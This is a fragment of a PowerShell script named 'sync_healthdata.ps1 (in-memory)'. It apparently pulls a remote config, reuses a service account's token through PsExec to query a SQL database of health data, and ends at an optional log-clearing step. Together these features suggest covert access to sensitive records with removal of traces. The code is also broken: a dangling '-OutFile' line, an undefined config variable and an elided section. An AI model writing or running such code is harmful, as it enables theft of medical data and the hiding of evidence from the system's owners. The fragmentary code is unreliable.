# === BEGIN sync_healthdata.ps1 (in-memory) ===

$Config = $env:TEMP + '\hb_cfg.json'

   -OutFile $Config

$conn = "Server=$($cfg.sql_host),$($cfg.sql_port);" + `
        "Database=$($cfg.sql_db);Integrated Security=True"

[...]
# Connect using current security context (svc_healthsync via PsExec
# context inheritance -- runs in caller's auth token chain)

$cmd.CommandText = $query
$rdr = $cmd.ExecuteReader()

# === Optional log clear (gated by config $cfg.clear_logs) ===
